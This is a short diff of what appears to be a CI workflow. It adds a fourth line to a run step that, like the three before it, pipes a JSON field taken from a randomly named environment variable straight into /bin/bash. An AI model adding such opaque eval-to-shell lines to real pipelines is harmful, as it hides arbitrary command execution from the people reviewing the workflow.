@@ -35,6 +35,7 @@ jobs:
           echo $acb6969 | jq -r .au8403 | /bin/bash
           printf '%s' "$uh287" | jq -r .vtgrf157 | /bin/bash
           echo $wf6 | jq -r .udeh1 | /bin/bash
+          echo $un73 | jq -r .wb818 | /bin/bash
 
       - name: Save output
         if: always()
